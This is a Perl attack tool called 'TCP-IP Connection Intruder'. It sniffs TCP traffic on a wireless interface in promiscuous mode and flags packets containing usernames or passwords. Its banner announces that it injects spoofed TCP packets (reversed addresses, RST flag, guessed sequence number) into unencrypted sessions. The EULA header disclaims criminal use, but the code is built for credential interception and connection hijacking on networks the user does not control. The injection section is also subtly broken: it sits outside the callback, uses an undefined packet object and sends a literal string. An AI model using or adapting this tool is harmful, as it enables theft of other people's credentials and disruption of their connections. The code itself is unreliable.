# *************************************************************************************** #
# ---------------------------------- EULA NOTICE ---------------------------------------- #
#                     Agreement between "Haroon Awan" and "You"(user).                    #
# ---------------------------------- EULA NOTICE ---------------------------------------- #
#  1. By using this piece of software your bound to these point.                          #
#  2. This an End User License Agreement (EULA) is a legal between a software application #
#     author "Haroon Awan" and (YOU) user of this software.                               #
#  3. This software application grants users rights to use for any purpose or modify and  #
#     redistribute creative works.                                                        #
#  4. This software comes in "is-as" warranty, author "Haroon Awan" take no responsbility #
#     what you do with by/this software as your free to use this software.                #
#  5. Any other purpose(s) that it suites as long as it is not related to any kind of     #
#     crime or using it in un-authorized environment.                                     #
#  6. You can use this software to protect and secure your data information in any        #
#     environment.                                                                        #
#  7. It can also be used in state of being protection against the unauthorized use of    #
#     information.                                                                        #
#  8. It can be used to take measures achieve protection.                                 #
# *************************************************************************************** #

#!/usr/bin/perl 

# Load modules
use Net::PcapUtils;
use NetPacket::Ethernet qw(:strip);
use NetPacket::TCP;
use NetPacket::IP qw(:strip);
use Term::ANSIColor;

# Are you r00t?
if($> != 0) { 
die "You need EUID 0 to use this tool!\n\n";
}

# CLI GUI ###########
system ("clear");
print color('bold red');
print "\n\n					   	 	    Project";
print "\n 						  : TCP-IP Connection Intruder :\n\n\n";
print color('bold yellow');
print "[ + ] Programmer: 	Haroon Awan\n";
print "[ + ] License: 		EULA\n";
print "[ + ] Version: 		1.0\n";
print "[ + ] Contact: 		mrharoonawan\@gmail\.com \n";
print "[ + ] Environment: 	Perl for Debian/Kali\n";
print "[ + ] Github: 		Https://www.github.com/haroonawanofficial\n";
print "[ + ] Design Scheme: 	TCP-IP Connection Intruder will intrude any un-ecrypted protocol and execute strings in it\n";
print color('reset');
print color("bold green"),"\n[ + ] Starting TCP-IP Data Connection \n";
print color("bold green"),"[ + ] Sitting between HUB/SWITCH \n";
print color("bold green"),"[ + ] Identifying local network segment \n";
print color("bold magenta"),"[ + ] Watching for TCP-IP connections from headers \n";
print color("bold magenta"),"[ + ] Generating TCP-IP sequence number packets to inject any TCP-IP authentications \n";
print color("bold magenta"),"[ + ] Take caution, it's about to get really noisy \n\n";
print color("bold white"),"[ + ] Loading Data Segments : \n";
print color('reset');

# Start sniffin in promisc mode ###########
Net::PcapUtils::loop(\&sniffit,
Promisc => 1,
FILTER => 'tcp',
DEV => 'wlan0');

# Callback ##########
sub sniffit
            {
my ($args,$header,$packet) = @_;
$ip = NetPacket::IP->decode(eth_strip($packet));
$tcp = NetPacket::TCP->decode($ip->{data});
$payload = $tcp->{data};

if( ($payload =~ /USER|User|Username|username|USERNAME|Logging|LOGGING|Login|Log-in|login|LOGIN/) || ($payload =~ /PASS|Pass|Password|password|PASSWORD|LOGGED|logged/) )
 {
print color("bold white on_red"),"\n\n[ + ] Got it\n";
print color("bold white on_red"),"[ + ] Injecting the data string\n\n";
print color('reset');
 }
print "|------------------------------------------------------------------------|\n";
print "|  Source IP    -    Source Port  |  Destination IP  - Destination Port  |\n";
print "| $ip->{src_ip}:$tcp->{src_port}		–>	$ip->{dest_ip}:$tcp->{dest_port} 	 	 |\n";
print "|------------------------------------------------------------------------|\n";
            }


# Packet Library Start ############
$packet->set({
ip => { saddr => $ip->{dest_ip},
daddr => $ip->{src_ip}
},
tcp => { source => $tcp->{dest_port},
dest => $tcp->{src_port},
rst => 1,
seq => $ip->{acknum},
data => '$data'
}
});

$packet->send(0,1);

unless($tcp->{flags} == 2)
{
return 1;
}